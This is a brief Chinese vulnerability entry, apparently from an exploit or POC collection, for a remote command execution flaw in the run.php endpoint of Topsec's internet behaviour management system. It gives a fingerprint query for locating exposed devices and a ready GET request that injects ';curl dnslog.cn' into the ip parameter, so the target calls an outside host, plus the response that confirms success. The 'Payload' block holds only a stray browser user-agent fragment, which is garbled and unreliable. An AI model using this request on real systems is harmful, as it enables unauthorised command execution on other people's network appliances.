# 天融信上网行为管理系统run.php远程命令执行漏洞

天融信上网行为管理系统run.php ｜ 命令执行 ｜ —
- **指纹**：`app="天融信-上网行为管理系统"`
- **请求**：`GET /view/ddos/run.php?ip=8.8.8.8;curl dnslog.cn&port=80&interface_src=eth0&time1=0&time2=0&status=1 HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 dnslog回显